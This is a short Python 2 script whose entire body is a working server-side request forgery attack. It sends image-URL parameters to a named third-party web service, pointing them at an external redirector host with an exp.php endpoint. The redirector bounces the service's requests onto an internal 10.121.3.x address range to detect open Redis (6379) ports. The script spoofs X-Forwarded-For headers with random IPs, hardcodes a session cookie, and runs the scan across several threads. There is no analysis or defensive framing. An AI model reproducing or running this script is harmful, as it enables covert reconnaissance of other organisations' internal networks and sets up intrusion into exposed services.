#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-07-05 20:55:30
# @Last Modified by:   Lcy
import requests
import threading
import Queue
import random
import time
url = "http://st.so.com/stu"
threads_count = 3
que = Queue.Queue()
lock = threading.Lock()
threads = []
ip = "10.121.3."
def getIp():
    return str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
headers = {
    "Cache-Control":"max-age=0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36",
    "Cookie": "__guid=6491553.4279294988408965000.1467944097350.527; PHPSESSID=d88gvotjet30c0cp28iuv1s771; count=45",
    "Content-Type":"application/x-www-form-urlencoded",
    "X-Forwarded-For":getIp(),
}
for i in range(1,255):
    que.put(ip + str(i))
def run():
    while que.qsize() > 0:
        ip = que.get()
        try:
            payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg".format(
                ip=ip,
                port="65321")
            param = {"imgurl":payload}
            r = requests.post(url,data=param,headers = headers,timeout=2.2)
            try:
                payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg".format(
                ip=ip,
                port="6379")
                param = {"imgurl":payload}
                r = requests.post(url,data=param,headers=headers,timeout=2.2)
                lock.acquire()
                print ip
                lock.release()
            except :
                lock.acquire()
                print "{ip}  6379 Open".format(ip=ip)
                lock.release()
        except:
            pass
for i in range(threads_count):
    t = threading.Thread(target=run)
    threads.append(t)
    t.setDaemon(True)
    t.start()
while que.qsize() > 0:
    time.sleep(1.0)
